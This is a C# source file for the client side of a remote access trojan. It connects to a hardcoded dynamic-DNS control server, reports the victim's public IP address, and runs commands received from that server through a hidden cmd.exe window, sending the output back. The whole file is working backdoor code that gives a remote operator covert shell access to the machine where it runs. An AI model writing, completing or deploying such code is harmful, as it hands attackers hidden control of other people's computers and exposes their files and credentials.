using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace RAT_clientside
{
    class Program
    {
        private static string HostName = "njratserver420.ddns.net";
        private static int Port = 6258; //TODO Make system that let's the user give input by using a cmd argument or default

        private static string cmd;

        private static StreamReader sr;
        private static StreamWriter sw;

        private static TcpClient client;

        private static bool connectedToServer = true; //TODO Make function to check if connected
        private static bool keepAlive = true; //Function that holds the program running

        public static void Main(string[] args)
        {
            while (keepAlive)
            {
                client = new TcpClient(HostName,Port); //Waits until it's connected

                sr = new StreamReader(client.GetStream());
                sw = new StreamWriter(client.GetStream());

                //Send the client IP to the server
                try
                {
                    sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
                    sw.Flush();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    throw;
                }

                //Create the cmd process to be used in the loop
                System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();

                cmdProcess.StartInfo.FileName = "cmd.exe";
                cmdProcess.StartInfo.CreateNoWindow = true;
                cmdProcess.StartInfo.UseShellExecute = false;
                cmdProcess.StartInfo.RedirectStandardOutput = true;
                cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                
                //Loop that's active aslong as server responds to pings
                while (connectedToServer)
                {
                    //Wait for incoming commands
                    try
                    {
                        cmd = sr.ReadLine();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                        throw;
                    }

                    //Execute commands
                    cmdProcess.StartInfo.Arguments = "/C" + cmd;
                    cmdProcess.Start();
                    string outPut = cmdProcess.StandardOutput.ReadLine(); //Get the output and store it in a string

                    //Send output back
                    try
                    {
                        sw.WriteLine(outPut);
                        sw.Flush();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                        throw;
                    }
                }
            }
        }

    }

}